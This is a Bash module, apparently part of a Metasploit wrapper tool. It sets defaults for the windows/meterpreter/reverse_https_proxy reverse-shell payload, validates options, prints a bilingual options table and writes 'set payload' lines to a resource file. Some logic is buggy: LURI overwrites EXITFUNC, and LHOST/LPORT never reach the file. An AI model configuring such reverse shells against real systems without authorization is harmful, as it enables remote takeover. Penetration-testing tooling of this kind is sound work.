function defaul_payload_options {
	lhost=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
	httpproxyhost=""
	httpproxypass=""
	httpproxyport=""
	httpproxytype="HTTP"
	httpproxyuser=""
	lport="4444"
	exitfunc="process"
	luri=""
}
function payload_compare {
lhost_lenght=`echo "$lhost" | awk '{print length}'`
	if  [ "$lhost_lenght" -le 18 ]; then
		payload1
	else
		payload2
	fi
}
function set_payload {
		if [[ "$new_processing_variables" = "lhost" ]] || [[ "$new_processing_variables" = "LHOST" ]] || [[ "$new_processing_variables" = "Lhost" ]]; then
			unset lhost
			lhost=$module_set
		elif [[ "$new_processing_variables" = "lport" ]] || [[ "$new_processing_variables" = "LPORT" ]] || [[ "$new_processing_variables" = "Lport" ]]; then
			unset lport
			lport="$module_set"
		elif [[ "$new_processing_variables" = "exitfunc" ]] || [[ "$new_processing_variables" = "EXITFUNC" ]] || [[ "$new_processing_variables" = "Exitfunc" ]]; then
			if [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]] || [[ "$module_set" = "" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "seh" ]] || [[ "$module_set" = "SEH" ]] || [[ "$module_set" = "Seh" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "thread" ]] || [[ "$module_set" = "THREAD" ]] || [[ "$module_set" = "Thread" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "process" ]] || [[ "$module_set" = "PROCESS" ]] || [[ "$module_set" = "Process," ]]; then
				unset exitfunc
				exitfunc="$module_set"
			elif [[ "$module_set" = "none" ]] || [[ "$module_set" = "NONE" ]] || [[ "$module_set" = "None" ]]; then
				unset exitfunc
				exitfunc="$module_set"
			else 	failed_to_validate=" $failed_validate'$module_set' $notvalid '$new_processing_variables'"
				echo -e "$red[-]$RESET" $failed_to_validate
			fi
		elif [[ "$new_processing_variables" = "httpproxyhost" ]] || [[ "$new_processing_variables" = "HTTPPROXYHOST" ]] || [[ "$new_processing_variables" = "Httpproxyhost" ]]; then
			unset httpproxyhost
			httpproxyhost="$module_set"
		elif [[ "$new_processing_variables" = "httpproxypass" ]] || [[ "$new_processing_variables" = "HTTPPROXYPASS" ]] || [[ "$new_processing_variables" = "Httpproxypass" ]]; then
			unset httpproxypass
			httpproxypass="$module_set"
		elif [[ "$new_processing_variables" = "httpproxyport" ]] || [[ "$new_processing_variables" = "HTTPPROXYPORT" ]] || [[ "$new_processing_variables" = "Httpproxyport" ]]; then
			unset httpproxyport
			httpproxyport="$module_set"
		elif [[ "$new_processing_variables" = "httpproxytype" ]] || [[ "$new_processing_variables" = "HTTPPROXYTYPE" ]] || [[ "$new_processing_variables" = "Httpproxytype" ]]; then
			unset httpproxytype
			httpproxytype="$module_set"
		elif [[ "$new_processing_variables" = "httpproxyuser" ]] || [[ "$new_processing_variables" = "HTTPPROXYUSER" ]] || [[ "$new_processing_variables" = "Httpproxyuser" ]]; then
			unset httpproxyuser
			httpproxyuser="$module_set"
		elif [[ "$new_processing_variables" = "luri" ]] || [[ "$new_processing_variables" = "LURI" ]] || [[ "$new_processing_variables" = "Luri" ]]; then
			unset exitfunc
			exitfunc="$module_set"
		fi
}
function payload1 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
lhost=`echo $lhost`
lhost_lenght=`echo $lhost | awk '{print length}'`
	integer=`expr 18 - $lhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	lhost=$lhost$myvar
unset_value
lport=`echo $lport`
lport_lenght=`echo $lport | awk '{print length}'`
	none=" "
	myvar=""
	integer=`expr 18 - $lport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	lport=$lport$myvar
unset_value
httpproxyhost=`echo $httpproxyhost`
httpproxyhost_lenght=`echo $httpproxyhost | awk '{print length}'`
	integer=`expr 18 - $httpproxyhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyhost=$httpproxyhost$myvar
unset_value
httpproxypass=`echo $httpproxypass`
httpproxypass_lenght=`echo $httpproxypass | awk '{print length}'`
	integer=`expr 18 - $httpproxypass_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxypass=$httpproxypass$myvar
unset_value
httpproxyport=`echo $httpproxyport`
httpproxyport_lenght=`echo $httpproxyport | awk '{print length}'`
	integer=`expr 18 - $httpproxyport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyport=$httpproxyport$myvar
unset_value
httpproxytype=`echo $httpproxytype`
httpproxytype_lenght=`echo $httpproxytype | awk '{print length}'`
	integer=`expr 18 - $httpproxytype_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxytype=$httpproxytype$myvar
unset_value
httpproxyuser=`echo $httpproxyuser`
httpproxyuser_lenght=`echo $httpproxyuser | awk '{print length}'`
	integer=`expr 18 - $httpproxyuser_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyuser=$httpproxyuser$myvar
unset_value
exitfunc=`echo $exitfunc`
exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
	integer=`expr 18 - $exitfunc_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	exitfunc=$exitfunc$myvar
unset_value
luri=`echo $luri`
luri_lenght=`echo $luri | awk '{print length}'`
	integer=`expr 18 - $luri_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	luri=$luri$myvar
unset_value
payload_banner_1
}
function payload2 {
none=" "
myvar=""
	function unset_value {
		unset none
		unset myvar
		unset integer
		none=" "
		myvar=""
	}
lhost=`echo $lhost`
lhost_lenght=`echo $lhost | awk '{print length}'`
	integer=`expr 27 - $lhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	lhost=$lhost$myvar
unset_value
lport=`echo $lport`
lport_lenght=`echo $lport | awk '{print length}'`
	none=" "
	myvar=""
	integer=`expr 27 - $lport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	lport=$lport$myvar
unset_value
httpproxyhost=`echo $httpproxyhost`
httpproxyhost_lenght=`echo $httpproxyhost | awk '{print length}'`
	integer=`expr 27 - $httpproxyhost_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyhost=$httpproxyhost$myvar
unset_value
httpproxypass=`echo $httpproxypass`
httpproxypass_lenght=`echo $httpproxypass | awk '{print length}'`
	integer=`expr 27 - $httpproxypass_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxypass=$httpproxypass$myvar
unset_value
httpproxyport=`echo $httpproxyport`
httpproxyport_lenght=`echo $httpproxyport | awk '{print length}'`
	integer=`expr 27 - $httpproxyport_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyport=$httpproxyport$myvar
unset_value
httpproxytype=`echo $httpproxytype`
httpproxytype_lenght=`echo $httpproxytype | awk '{print length}'`
	integer=`expr 27 - $httpproxytype_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxytype=$httpproxytype$myvar
unset_value
httpproxyuser=`echo $httpproxyuser`
httpproxyuser_lenght=`echo $httpproxyuser | awk '{print length}'`
	integer=`expr 27 - $httpproxyuser_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
		myvar=$myvar$none
	done
	httpproxyuser=$httpproxyuser$myvar
unset_value
exitfunc=`echo $exitfunc`
exitfunc_lenght=`echo $exitfunc | awk '{print length}'`
	integer=`expr 27 - $exitfunc_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	exitfunc=$exitfunc$myvar
unset_value
luri=`echo $luri`
luri_lenght=`echo $luri | awk '{print length}'`
	integer=`expr 27 - $luri_lenght`			
	for (( i = 0 ; i < $integer; i++ )) do
	myvar=$myvar$none
	done
	luri=$luri$myvar
unset_value
payload_banner_2
}
function payload_banner_1 {
if [ "$language" = "VN" ]; then
yes="     Có   "
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_https_proxy):

   Tên            Thiết lập hiện tại    Yêu cầu   Miêu tả
   ----           ----------------      --------  -----------
   EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
   HttpProxyHost  $httpproxyhost$no   Một địa chỉ IP máy chủ proxy hoặc tên máy chủ proxy.
   HttpProxyPort  $httpproxyport$no   Cổng máy chủ proxy.
   HttpProxyType  $httpproxytype$no   Kiểu proxy (Được chấp nhận: HTTP, SOCKS).
   HttpProxyUser  $httpproxyuser$no   Tên người dùng của máy chủ proxy.
   HttpProxyPass  $httpproxypass$no   Mật khẩu máy chủ proxy.
   LHOST          $lhost$yes    Địa chỉ lắng nghe.
   LPORT          $lport$yes    Cổng lắng nghe.
   LURI           $luri$no   Đường dẫn HTTP.
!
elif [ "$language" = "EN" ]; then
yes="     yes"
no="     no "
cat << !
Payload options (windows/meterpreter/reverse_https_proxy):

   Name           Current Setting       Required  Description
   ----           ---------------       --------  -----------
   EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
   HttpProxyHost  $httpproxyhost$no      An optional proxy server IP address or hostname.
   HttpProxyPort  $httpproxyport$no      An optional proxy server port.
   HttpProxyType  $httpproxytype$no      The type of HTTP proxy (Accepted: HTTP, SOCKS).
   HttpProxyUser  $httpproxyuser$no      An optional proxy server username.
   HttpProxyPass  $httpproxypass$no      An optional proxy server password.
   LHOST          $lhost$yes      The listen address.
   LPORT          $lport$yes      The listen port.
   LURI           $luri$no      The HTTP Path.

!
fi
}
function payload_banner_2 {
if [ "$language" = "VN" ]; then
yes="   Có  "
no="   Không "
cat << !
Các tùy chọn của tải trọng (windows/meterpreter/reverse_https_proxy):

   Tên            Thiết lập hiện tại	       Yêu cầu    Miêu tả
   ----      	  ---------------  	       --------  -----------
   EXITFUNC       $exitfunc$no   Biện pháp tạo lối thoát (Được chấp nhận: '', seh, thread, process, none).
   HttpProxyHost  $httpproxyhost$no   Một địa chỉ IP máy chủ proxy hoặc tên máy chủ proxy.
   HttpProxyPort  $httpproxyport$no   Cổng máy chủ proxy.
   HttpProxyType  $httpproxytype$no   Kiểu proxy (Được chấp nhận: HTTP, SOCKS).
   HttpProxyUser  $httpproxyuser$no   Tên người dùng của máy chủ proxy.
   HttpProxyPass  $httpproxypass$no   Mật khẩu máy chủ proxy.
   LHOST          $lhost$yes     Địa chỉ lắng nghe.
   LPORT          $lport$yes     Cổng lắng nghe.
   LURI           $luri$no   Đường dẫn HTTP.

!
elif [ "$language" = "EN" ]; then
yes="   yes"
no="   no "
cat << !
Payload options (windows/meterpreter/reverse_https_proxy):

   Name           Current Setting  	       Required  Description
   ----           ---------------  	       --------  -----------
   EXITFUNC       $exitfunc$no      Exit technique (Accepted: '', seh, thread, process, none).
   HttpProxyHost  $httpproxyhost$no      An optional proxy server IP address or hostname.
   HttpProxyPort  $httpproxyport$no      An optional proxy server port.
   HttpProxyType  $httpproxytype$no      The type of HTTP proxy (Accepted: HTTP, SOCKS).
   HttpProxyUser  $httpproxyuser$no      An optional proxy server username.
   HttpProxyPass  $httpproxypass$no      An optional proxy server password.
   LHOST          $lhost$yes      The listen address.
   LPORT          $lport$yes      The listen port.
   LURI           $luri$no      The HTTP Path.

!
fi
}
function payload_run {
payload_path_present=`pwd`
payload_path_rc_file="$payload_path_present/Config"
rc_file="$payload_path_rc_file/file.rc"
config_file="$payload_path_present/Config/config"
	echo "set payload windows/meterpreter/reverse_https_proxy" >> $rc_file
	echo "set EXITFUNC $exitfunc" >> $rc_file
	echo "set HttpProxyHost $httpproxyhost" >> $rc_file
	echo "set HttpProxyPort $httpproxyport" >> $rc_file
	echo "set HttpProxyType $httpproxytype" >> $rc_file
	echo "set HttpProxyUser $httpproxyuser" >> $rc_file
	echo "set HttpProxyPass $httpproxypass" >> $rc_file
	paylo="windows/meterpreter/reverse_https_proxy"
	lhost=$lhost
	lport=$lport
}
